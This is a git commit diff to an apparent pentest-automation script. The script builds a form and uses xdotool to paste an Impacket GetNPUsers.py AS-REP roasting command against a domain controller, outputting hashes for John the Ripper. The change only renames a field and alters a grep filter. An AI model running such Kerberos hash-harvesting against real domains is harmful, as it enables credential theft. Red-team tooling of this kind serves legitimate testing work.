1ecbd1b11d36fa8181a299245fbf0955e02b8247
Danny van der Knaap <dvdknaap@users.noreply.github.com>
2025-03-29 19:07:53 -0400

    feat(bash): new scripts (#81)

--- code/xdotool/scripts/reconnaissance/windows/asreproast/do_asreproast_attack_john.sh
+++ code/xdotool/scripts/reconnaissance/windows/asreproast/do_asreproast_attack_john.sh
@@ -7,14 +7,14 @@ do an asreproast attack
 # Generate GUI form items (label, type (optional: default text), name, default (optional))
 DOMAIN_FIELD=$(form_item  "domain" "domain")
 USERS_FILE_FIELD=$(form_item  "users file" "users_file")
-DC_IP_FIELD=$(form_item  "DC ip" "dc_ip")
+DC_IP_FIELD=$(form_item  "DC ip" "ip")
 
 # Generate GUI form
 generate_form "${DOMAIN_FIELD}" "${USERS_FILE_FIELD}" "${DC_IP_FIELD}"
 
 DOMAIN=${form_data["domain"]}
 USERS_FILE=${form_data["users_file"]}
-DC_IP=${form_data["dc_ip"]}
+DC_IP=${form_data["ip"]}
 
-paste_command "GetNPUsers.py ${DOMAIN}/ -dc-ip ${DC_IP} -format john -no-pass -usersfile ${USERS_FILE} | grep -v '[-]'"
+paste_command "GetNPUsers.py ${DOMAIN}/ -dc-ip ${DC_IP} -format john -no-pass -usersfile ${USERS_FILE} | grep -v 'KDC_ERR'"
 xdotool key Return
